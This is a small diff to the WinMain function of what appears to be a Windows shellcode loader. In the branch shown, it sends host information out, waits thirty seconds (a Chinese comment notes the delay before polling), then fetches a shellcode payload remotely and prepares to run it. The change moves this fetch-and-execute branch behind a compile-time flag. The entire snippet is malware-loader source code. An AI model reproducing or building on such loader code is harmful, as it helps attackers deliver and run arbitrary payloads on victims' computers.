@@ -200,17 +200,21 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		shellcode_ptr = shellcode;
 		size = shellcode_size;
 	}
+
+#ifdef ENABLE_ADMISSION_PLATFORM
 	else if (EnableAccessControl) {
 		send_info();
-
+	
 		custom_sleep(1000 * 30); // 等待半分钟后开始轮询
 		shellcode_vec = fetch_payload();
-
+	
 		size = shellcode_vec.size();
 		if (size == 0) return 0;
-
+	
 		shellcode_ptr = shellcode_vec.data();
 	}
+#endif
+
 	else {
 		size = shellcode_size;
 		shellcode_ptr = shellcode;
